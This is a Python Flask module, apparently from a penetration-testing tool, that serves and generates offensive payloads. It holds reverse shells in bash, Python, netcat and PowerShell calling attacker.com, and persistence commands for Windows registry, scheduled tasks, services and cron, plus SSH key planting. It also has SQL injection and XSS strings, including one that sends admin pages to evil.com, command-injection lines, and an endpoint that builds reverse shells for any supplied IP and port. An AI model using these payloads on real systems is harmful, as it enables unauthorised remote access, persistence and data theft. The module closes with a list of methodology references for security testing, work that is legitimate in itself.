from flask import Blueprint, jsonify, request
from flask_cors import cross_origin
import json
import base64
import hashlib
import urllib.parse
import html
import re
from datetime import datetime

advanced_testing_bp = Blueprint('advanced_testing', __name__)

# Persistence techniques database
PERSISTENCE_TECHNIQUES = {
    "windows": {
        "registry_run_keys": {
            "name": "Registry Run Keys",
            "description": "Modifica chaves do registro para execução automática",
            "mitre_id": "T1547.001",
            "locations": [
                "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
                "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
                "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce"
            ],
            "examples": [
                'reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "Updater" /t REG_SZ /d "C:\\temp\\malware.exe"',
                'New-ItemProperty -Path "HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" -Name "Updater" -Value "C:\\temp\\malware.exe"'
            ]
        },
        "scheduled_tasks": {
            "name": "Scheduled Tasks",
            "description": "Cria tarefas agendadas para execução periódica",
            "mitre_id": "T1053.005",
            "examples": [
                'schtasks /create /tn "SystemUpdate" /tr "C:\\temp\\malware.exe" /sc daily /st 09:00',
                'Register-ScheduledTask -TaskName "SystemUpdate" -Action (New-ScheduledTaskAction -Execute "C:\\temp\\malware.exe")'
            ]
        },
        "services": {
            "name": "Windows Services",
            "description": "Instala malware como serviço do Windows",
            "mitre_id": "T1543.003",
            "examples": [
                'sc create "FakeService" binpath= "C:\\temp\\malware.exe" start= auto',
                'New-Service -Name "FakeService" -BinaryPathName "C:\\temp\\malware.exe" -StartupType Automatic'
            ]
        },
        "startup_folder": {
            "name": "Startup Folder",
            "description": "Coloca executáveis na pasta de inicialização",
            "mitre_id": "T1547.001",
            "locations": [
                "%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup",
                "%ALLUSERSPROFILE%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"
            ]
        }
    },
    "linux": {
        "cron_jobs": {
            "name": "Cron Jobs",
            "description": "Agenda execução através do crontab",
            "mitre_id": "T1053.003",
            "examples": [
                'echo "0 */1 * * * /tmp/malware" | crontab -',
                '(crontab -l ; echo "0 */1 * * * /tmp/malware") | crontab -'
            ]
        },
        "systemd_services": {
            "name": "Systemd Services",
            "description": "Cria serviços systemd para persistência",
            "mitre_id": "T1543.002",
            "examples": [
                'systemctl enable malware.service',
                'systemctl start malware.service'
            ]
        },
        "bashrc_profile": {
            "name": "Shell Profile",
            "description": "Modifica arquivos de perfil do shell",
            "mitre_id": "T1546.004",
            "locations": [
                "~/.bashrc",
                "~/.bash_profile",
                "~/.profile",
                "/etc/profile"
            ]
        },
        "ssh_keys": {
            "name": "SSH Authorized Keys",
            "description": "Adiciona chaves SSH para acesso remoto",
            "mitre_id": "T1098.004",
            "examples": [
                'echo "ssh-rsa AAAAB3... attacker@evil.com" >> ~/.ssh/authorized_keys',
                'chmod 600 ~/.ssh/authorized_keys'
            ]
        }
    }
}

# Advanced payload database
PAYLOAD_DATABASE = {
    "web_attacks": {
        "sql_injection": {
            "basic": [
                "' OR '1'='1",
                "' OR 1=1--",
                "' UNION SELECT NULL--",
                "'; DROP TABLE users; --"
            ],
            "time_based": [
                "'; WAITFOR DELAY '00:00:05'--",
                "' OR SLEEP(5)--",
                "'; SELECT pg_sleep(5)--"
            ],
            "union_based": [
                "' UNION SELECT 1,2,3,4,5--",
                "' UNION SELECT user(),database(),version()--",
                "' UNION SELECT table_name FROM information_schema.tables--"
            ]
        },
        "xss": {
            "basic": [
                "<script>alert('XSS')</script>",
                "<img src=x onerror=alert('XSS')>",
                "<svg onload=alert('XSS')>"
            ],
            "advanced": [
                "<script>fetch('/admin/users').then(r=>r.text()).then(d=>fetch('http://evil.com/?data='+btoa(d)))</script>",
                "<iframe src=javascript:alert('XSS')></iframe>",
                "<details open ontoggle=alert('XSS')>"
            ],
            "filter_bypass": [
                "<ScRiPt>alert('XSS')</ScRiPt>",
                "javascript:alert('XSS')",
                "<img src=\"x\" onerror=\"eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))\">"
            ]
        },
        "command_injection": [
            "; ls -la",
            "| whoami",
            "&& cat /etc/passwd",
            "; nc -e /bin/sh attacker.com 4444",
            "| python -c \"import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('attacker.com',4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(['/bin/sh','-i']);\""
        ]
    },
    "reverse_shells": {
        "bash": [
            "bash -i >& /dev/tcp/attacker.com/4444 0>&1",
            "exec 5<>/dev/tcp/attacker.com/4444;cat <&5 | while read line; do $line 2>&5 >&5; done"
        ],
        "python": [
            "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"attacker.com\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'",
            "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"attacker.com\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"
        ],
        "netcat": [
            "nc -e /bin/sh attacker.com 4444",
            "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc attacker.com 4444 >/tmp/f"
        ],
        "powershell": [
            "powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient(\"attacker.com\",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + \"PS \" + (pwd).Path + \"> \";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
        ]
    },
    "privilege_escalation": {
        "linux": [
            "sudo -l",
            "find / -perm -u=s -type f 2>/dev/null",
            "find / -perm -4000 -type f -exec ls -la {} 2>/dev/null \\;",
            "cat /etc/crontab",
            "ps aux | grep root"
        ],
        "windows": [
            "whoami /priv",
            "net user",
            "net localgroup administrators",
            "systeminfo | findstr /B /C:\"OS Name\" /C:\"OS Version\"",
            "wmic qfe get Description,HotFixID,InstalledOn"
        ]
    }
}

@advanced_testing_bp.route('/testing/persistence-techniques', methods=['GET'])
@cross_origin()
def get_persistence_techniques():
    """Get persistence techniques database"""
    try:
        return jsonify({
            'success': True,
            'techniques': PERSISTENCE_TECHNIQUES
        })
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@advanced_testing_bp.route('/testing/payloads', methods=['GET'])
@cross_origin()
def get_payload_database():
    """Get payload database"""
    try:
        category = request.args.get('category', 'all')
        
        if category == 'all':
            return jsonify({
                'success': True,
                'payloads': PAYLOAD_DATABASE
            })
        elif category in PAYLOAD_DATABASE:
            return jsonify({
                'success': True,
                'payloads': {category: PAYLOAD_DATABASE[category]}
            })
        else:
            return jsonify({'error': 'Category not found'}), 404
            
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@advanced_testing_bp.route('/testing/generate-payload', methods=['POST'])
@cross_origin()
def generate_custom_payload():
    """Generate custom payload based on parameters"""
    try:
        data = request.get_json()
        payload_type = data.get('type', '')
        target_ip = data.get('target_ip', 'attacker.com')
        target_port = data.get('target_port', '4444')
        shell_type = data.get('shell_type', 'bash')
        
        generated_payloads = []
        
        if payload_type == 'reverse_shell':
            if shell_type == 'bash':
                generated_payloads.append(f"bash -i >& /dev/tcp/{target_ip}/{target_port} 0>&1")
                generated_payloads.append(f"exec 5<>/dev/tcp/{target_ip}/{target_port};cat <&5 | while read line; do $line 2>&5 >&5; done")
            
            elif shell_type == 'python':
                generated_payloads.append(f"python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{target_ip}\",{target_port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'")
            
            elif shell_type == 'netcat':
                generated_payloads.append(f"nc -e /bin/sh {target_ip} {target_port}")
                generated_payloads.append(f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {target_ip} {target_port} >/tmp/f")
            
            elif shell_type == 'powershell':
                ps_payload = f"powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient(\"{target_ip}\",{target_port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + \"PS \" + (pwd).Path + \"> \";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()"
                generated_payloads.append(ps_payload)
        
        elif payload_type == 'persistence':
            os_type = data.get('os_type', 'windows')
            technique = data.get('technique', 'registry_run_keys')
            malware_path = data.get('malware_path', 'C:\\temp\\malware.exe')
            
            if os_type in PERSISTENCE_TECHNIQUES and technique in PERSISTENCE_TECHNIQUES[os_type]:
                tech_data = PERSISTENCE_TECHNIQUES[os_type][technique]
                if 'examples' in tech_data:
                    for example in tech_data['examples']:
                        generated_payloads.append(example.replace('C:\\temp\\malware.exe', malware_path))
        
        return jsonify({
            'success': True,
            'generated_payloads': generated_payloads,
            'parameters': {
                'type': payload_type,
                'target_ip': target_ip,
                'target_port': target_port,
                'shell_type': shell_type
            },
            'timestamp': datetime.now().isoformat()
        })
        
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@advanced_testing_bp.route('/testing/encode-payload', methods=['POST'])
@cross_origin()
def encode_payload():
    """Encode payload in various formats"""
    try:
        data = request.get_json()
        payload = data.get('payload', '')
        encoding_types = data.get('encodings', ['base64', 'url', 'hex'])
        
        if not payload:
            return jsonify({'error': 'Payload is required'}), 400
        
        encoded_results = {}
        
        for encoding in encoding_types:
            try:
                if encoding == 'base64':
                    encoded_results[encoding] = base64.b64encode(payload.encode()).decode()
                elif encoding == 'url':
                    encoded_results[encoding] = urllib.parse.quote(payload)
                elif encoding == 'html':
                    encoded_results[encoding] = html.escape(payload)
                elif encoding == 'hex':
                    encoded_results[encoding] = payload.encode().hex()
                elif encoding == 'unicode':
                    encoded_results[encoding] = ''.join(f'\\u{ord(c):04x}' for c in payload)
                elif encoding == 'md5':
                    encoded_results[encoding] = hashlib.md5(payload.encode()).hexdigest()
                elif encoding == 'sha1':
                    encoded_results[encoding] = hashlib.sha1(payload.encode()).hexdigest()
                elif encoding == 'sha256':
                    encoded_results[encoding] = hashlib.sha256(payload.encode()).hexdigest()
            except Exception as e:
                encoded_results[encoding] = f"Error: {str(e)}"
        
        return jsonify({
            'success': True,
            'original_payload': payload,
            'encoded_payloads': encoded_results,
            'timestamp': datetime.now().isoformat()
        })
        
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@advanced_testing_bp.route('/testing/vulnerability-suggestions', methods=['POST'])
@cross_origin()
def get_vulnerability_suggestions():
    """Generate vulnerability test suggestions based on target info"""
    try:
        data = request.get_json()
        target_info = data.get('target_info', {})
        
        suggestions = []
        
        # Analyze target information and suggest tests
        if 'web_server' in target_info:
            suggestions.extend([
                {
                    'category': 'Web Application',
                    'test': 'SQL Injection',
                    'description': 'Test for SQL injection vulnerabilities',
                    'payloads': PAYLOAD_DATABASE['web_attacks']['sql_injection']['basic'][:3]
                },
                {
                    'category': 'Web Application',
                    'test': 'Cross-Site Scripting (XSS)',
                    'description': 'Test for XSS vulnerabilities',
                    'payloads': PAYLOAD_DATABASE['web_attacks']['xss']['basic'][:3]
                }
            ])
        
        if 'ssh_service' in target_info:
            suggestions.append({
                'category': 'Network Service',
                'test': 'SSH Brute Force',
                'description': 'Test for weak SSH credentials',
                'payloads': ['hydra -l admin -P passwords.txt ssh://target']
            })
        
        if 'windows_os' in target_info:
            suggestions.extend([
                {
                    'category': 'Operating System',
                    'test': 'Windows Privilege Escalation',
                    'description': 'Test for privilege escalation vectors',
                    'payloads': PAYLOAD_DATABASE['privilege_escalation']['windows'][:3]
                },
                {
                    'category': 'Persistence',
                    'test': 'Registry Run Keys',
                    'description': 'Test persistence via registry',
                    'payloads': PERSISTENCE_TECHNIQUES['windows']['registry_run_keys']['examples'][:2]
                }
            ])
        
        if 'linux_os' in target_info:
            suggestions.extend([
                {
                    'category': 'Operating System',
                    'test': 'Linux Privilege Escalation',
                    'description': 'Test for privilege escalation vectors',
                    'payloads': PAYLOAD_DATABASE['privilege_escalation']['linux'][:3]
                },
                {
                    'category': 'Persistence',
                    'test': 'Cron Jobs',
                    'description': 'Test persistence via cron',
                    'payloads': PERSISTENCE_TECHNIQUES['linux']['cron_jobs']['examples']
                }
            ])
        
        # Default suggestions if no specific target info
        if not suggestions:
            suggestions = [
                {
                    'category': 'General',
                    'test': 'Basic Web Attacks',
                    'description': 'Test common web vulnerabilities',
                    'payloads': PAYLOAD_DATABASE['web_attacks']['sql_injection']['basic'][:2]
                },
                {
                    'category': 'General',
                    'test': 'Command Injection',
                    'description': 'Test for command injection',
                    'payloads': PAYLOAD_DATABASE['web_attacks']['command_injection'][:3]
                }
            ]
        
        return jsonify({
            'success': True,
            'suggestions': suggestions,
            'target_info': target_info,
            'timestamp': datetime.now().isoformat()
        })
        
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@advanced_testing_bp.route('/testing/methodology-papers', methods=['GET'])
@cross_origin()
def get_methodology_papers():
    """Get curated list of security testing methodologies and papers"""
    try:
        papers = [
            {
                'title': 'OWASP Testing Guide v4.0',
                'category': 'Web Application Security',
                'description': 'Comprehensive guide for web application security testing',
                'url': 'https://owasp.org/www-project-web-security-testing-guide/',
                'topics': ['SQL Injection', 'XSS', 'Authentication', 'Session Management']
            },
            {
                'title': 'NIST SP 800-115',
                'category': 'Penetration Testing',
                'description': 'Technical Guide to Information Security Testing and Assessment',
                'url': 'https://csrc.nist.gov/publications/detail/sp/800-115/final',
                'topics': ['Planning', 'Discovery', 'Attack', 'Reporting']
            },
            {
                'title': 'MITRE ATT&CK Framework',
                'category': 'Threat Intelligence',
                'description': 'Knowledge base of adversary tactics and techniques',
                'url': 'https://attack.mitre.org/',
                'topics': ['Persistence', 'Privilege Escalation', 'Defense Evasion', 'Lateral Movement']
            },
            {
                'title': 'PTES - Penetration Testing Execution Standard',
                'category': 'Penetration Testing',
                'description': 'Standard for penetration testing execution',
                'url': 'http://www.pentest-standard.org/',
                'topics': ['Pre-engagement', 'Intelligence Gathering', 'Threat Modeling', 'Vulnerability Analysis']
            },
            {
                'title': 'OSSTMM - Open Source Security Testing Methodology Manual',
                'category': 'Security Testing',
                'description': 'Methodology for security testing and analysis',
                'url': 'https://www.isecom.org/OSSTMM.3.pdf',
                'topics': ['Human Security', 'Physical Security', 'Wireless Security', 'Telecommunications']
            }
        ]
        
        return jsonify({
            'success': True,
            'papers': papers,
            'total_count': len(papers)
        })
        
    except Exception as e:
        return jsonify({'error': str(e)}), 500

